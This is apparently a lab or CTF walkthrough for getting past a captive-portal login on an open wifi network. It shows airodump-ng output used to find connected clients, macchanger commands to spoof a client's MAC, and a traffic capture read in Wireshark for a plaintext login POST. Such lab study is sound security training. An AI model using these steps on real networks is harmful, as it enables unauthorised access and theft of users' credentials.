1. free.conf like 05 hit the login wall.
2. To bypass this login we can use the MAC of a client connected to that network that we see with traffic, for that we can use `airodump-ng` again and impersonate one of those MAC.
3. https://github.com/V0lk3n/WirelessPentesting-CheatSheet/tree/89f80c36a8f1e9b4af6a220da374d2f8b4246de2?tab=readme-ov-file#display-wireless-card-mac-address
4. 
```bash
macchanger -s wlan0
[ERROR] Set device name: No such device

macchanger -s wlan2
Current MAC:   8e:16:c5:b6:e7:3b (unknown)
Permanent MAC: 02:00:00:00:02:00 (unknown)

macchanger -s wlan2
Current MAC:   ba:1d:37:4b:53:64 (unknown)
Permanent MAC: 02:00:00:00:02:00 (unknown)
```

5. Get client mac
```bash
sudo airodump-ng wlan0mon -c 6


 CH  6 ][ Elapsed: 24 s ][ 2024-05-20 16:43 ][ paused output                                                                                     
                                                                                                                                                 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                             
                                                                                                                                                 
 96:88:B6:01:DE:DE  -28 100      246        0    0   6   54   WPA2 CCMP   PSK  MiFibra-5-D6G3                                                    
 5A:70:5E:52:94:AC  -28 100      246        0    0   6   54   WPA2 CCMP   PSK  WIFI-JUAN                                                         
 F0:9F:C2:71:22:10  -28   0      246       66    2   6   54   OPN              wifi-guest                                                        
 F0:9F:C2:71:22:12  -28   0      246       72    1   6   54   WPA2 CCMP   PSK  wifi-mobile                                                       
 F0:9F:C2:AA:19:29  -28   0      246     9234  369   1   54   WEP  WEP         wifi-old                                                          
                                                                                                                                                 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                               
                                                                                                                                                 
 (not associated)   64:32:A8:BA:18:42  -26    0 - 1      0        2                                                                              
 (not associated)   64:32:A8:07:6C:40  -26    0 - 1      0        6         AP_router,wifi-corp                                                  
 (not associated)   B4:99:BA:6F:F9:45  -49    0 - 1     12       12         wifi-offices,Jason                                                   
 (not associated)   64:32:A8:BA:6C:41  -26    0 - 1      0        4         wifi-corp                                                            
 (not associated)   78:C1:A7:BF:72:46  -49    0 - 1     12       12         wifi-offices,Jason                                                   
 (not associated)   64:32:A8:AD:AB:53  -49    0 - 1      8       12         wifi-corp-legacy                                                     
 F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -29   54 -54      0        4                                                                              
 F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -29   54 -54      0        6                                                                              
 F0:9F:C2:71:22:10  80:18:44:BF:72:47  -29   54 -54      0       56
 ```
 Last three are the ones

6. Let's impersonate

```bash
sudo systemctl stop network-manager

sudo ip link set wlan2 down

sudo macchanger -m B0:72:BF:44:B0:49 wlan2

sudo ip link set wlan2 up
```

`sudo dhclient -v wlan2`

If not working, do a reset here.

7. Once we have changed the mac with “macchanger” we connect again with “wpa_supplicant” and we can see that we can access the server login.

To obtain the login credentials we make a capture of “airodump-ng” saving the output with “-w” and after a while (3–5 min approx) we can see HTTP requests in the “.cap” file with “wireshark” in which there is a POST with username and password.

```bash
sudo airmon-ng start wlan0

sudo airodump-ng wlan0mon -c 6 -w wifi-guest.cap <- no need for .cap extension

        new file:   OPN/06/wifi-guest.cap-01.cap
        new file:   OPN/06/wifi-guest.cap-01.csv
        new file:   OPN/06/wifi-guest.cap-01.kismet.csv
        new file:   OPN/06/wifi-guest.cap-01.kismet.netxml
        new file:   OPN/06/wifi-guest.cap-01.log.csv
```

8. WireShare check the plain password

HTML Form URL Encoded: application/x-www-form-urlencoded

Login with creds done.